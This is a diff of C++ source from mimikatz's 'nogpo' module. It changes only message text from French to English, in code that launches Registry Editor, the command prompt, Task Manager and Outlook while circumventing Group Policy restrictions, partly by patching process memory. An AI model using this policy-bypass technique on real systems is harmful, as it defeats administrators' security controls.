@@ -8,28 +8,28 @@
 vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_nogpo::getMimiKatzCommands()
 {
 	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(regedit,	L"regedit",	L"Lance un éditeur de registre, ignorant DisableRegistryTools"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(cmd,		L"cmd",		L"Lance une invite de commande, ignorant DisableCMD"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(taskmgr,	L"taskmgr",	L"Lance le gestionnaire de tache, ignorant DisableTaskMgr"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(olpst,	L"olpst",	L"Lance Outlook, ignorant DisablePst"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(regedit,	L"regedit",	L"Launches Registry Editor, ignoring DisableRegistryTools"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(cmd,		L"cmd",		L"Launches a command prompt, ignoring DisableCMD"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(taskmgr,	L"taskmgr",	L"Launches the task manager, ignoring DisableTaskMgr"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(olpst,	L"olpst",	L"LaunchesOutlook, ignoring DisablePST"));
 	return monVector;
 }
 
 bool mod_mimikatz_nogpo::regedit(vector<wstring> * arguments)
 {
-	wcout << L"Editeur de registre : " << (disableSimple(L"regedit.exe", L"DisableRegistryTools", L"KiwiAndRegistryTools") ? "OK" : "KO") << endl;
+	wcout << L"Registry Editor : " << (disableSimple(L"regedit.exe", L"DisableRegistryTools", L"KiwiAndRegistryTools") ? "OK" : "KO") << endl;
 	return true;
 }
 
 bool mod_mimikatz_nogpo::cmd(vector<wstring> * arguments)
 {
-	wcout << L"Invite de commande : " << (disableSimple(L"cmd.exe", L"DisableCMD", L"KiwiAndCMD") ? "OK" : "KO") << endl;
+	wcout << L"Command prompt : " << (disableSimple(L"cmd.exe", L"DisableCMD", L"KiwiAndCMD") ? "OK" : "KO") << endl;
 	return true;
 }
 
 bool mod_mimikatz_nogpo::taskmgr(vector<wstring> * arguments)
 {
-	wcout << L"Gestionnaire de taches : " << (disableSimple(L"taskmgr.exe", L"DisableTaskMgr", L"KiwiAndTaskMgr") ? "OK" : "KO") << endl;
+	wcout << L"Task Manager : " << (disableSimple(L"taskmgr.exe", L"DisableTaskMgr", L"KiwiAndTaskMgr") ? "OK" : "KO") << endl;
 	return true;
 }
 
@@ -45,12 +45,12 @@ bool mod_mimikatz_nogpo::olpst(vector<wstring> * arguments)
 		DWORD pidOutlook = 0;
 		bool reussite = disableSimple(pathToOutlook, szDisable, szKiwi, &pidOutlook);
 		
-		wcout << L"Outlook avec PST   : " << (reussite ? L"OK" : L"KO");
+		wcout << L"Outlook w/PST   : " << (reussite ? L"OK" : L"KO");
 		if(reussite)
 		{
 			mod_patch::patchModuleOfPID(pidOutlook, L"olmapi32.dll", reinterpret_cast<BYTE *>(szDisable), sizeof(szDisable), reinterpret_cast<BYTE *>(szKiwi), sizeof(szKiwi));
 		}
-	} else wcout << L"Outlook introuvable" << endl;
+	} else wcout << L"Outlook not found" << endl;
 	return true;
 }
 
@@ -114,13 +114,13 @@ bool mod_mimikatz_nogpo::getApplicationPathFromCLSID(wstring application, wstrin
 									path->assign(reinterpret_cast<wchar_t *>(monPath));
 								} else wcout << "RegQueryValueEx \'" << monPath <<  "\' : " << mod_system::getWinError(false, regError) << endl;
 								delete[] monPath;
-							} else wcout << "Le type retourné par \'" << monPath <<  "\' n\'est pas : REG_SZ" << endl;
+							} else wcout << "The type returned by \'" << monPath <<  "\' is not : REG_SZ" << endl;
 						} else wcout << "RegQueryValueEx \'" << monPath <<  "\' : " << mod_system::getWinError(false, regError) << endl;
 						RegCloseKey(hApplicationPath);
 					} else wcout << "RegOpenKeyEx \'" << regPathToPath <<  "\' : " << mod_system::getWinError(false, regError) << endl;
 				} else wcout << "RegQueryValueEx \'" << monGUID <<  "\' : " << mod_system::getWinError(false, regError) << endl;
 				delete[] monGUID;
-			} else wcout << "Le type retourné par \'" << monGUID <<  "\' n\'est pas : REG_SZ" << endl;
+			} else wcout << "The type returned by \'" << monGUID <<  "\' is not : REG_SZ" << endl;
 		} else wcout << "RegQueryValueEx \'" << monGUID <<  "\' : " << mod_system::getWinError(false, regError) << endl;
 		RegCloseKey(hApplication);
 	} else wcout << "RegOpenKeyEx \'" << pathToApplication <<  "\' : " << mod_system::getWinError(false, regError) << endl;
@@ -186,7 +186,7 @@ bool mod_mimikatz_nogpo::disableSimple(wstring commandLine, wstring origKey, wst
 
 		reussite = disableSimple(commandLine, taillePattern, maCleDeDepart, maCleFinale, monPID);
 	}
-	else wcout << L"mod_mimikatz_nogpo::disableSimple (unicode) Taille du pattern original différente du pattern cible" << endl;
+	else wcout << L"mod_mimikatz_nogpo::disableSimple (unicode) Size of the original pattern different than pattern of target" << endl;
 
 	return reussite;
 }
@@ -203,7 +203,7 @@ bool mod_mimikatz_nogpo::disableSimple(wstring commandLine, string origKey, stri
 
 		reussite = disableSimple(commandLine, taillePattern, maCleDeDepart, maCleFinale, monPID);
 	}
-	else wcout << L"mod_mimikatz_nogpo::disableSimple (non-unicode) Taille du pattern original différente du pattern cible" << endl;
+	else wcout << L"mod_mimikatz_nogpo::disableSimple (non-unicode) Size of the original pattern different than pattern of target" << endl;
 
 	return reussite;
 }
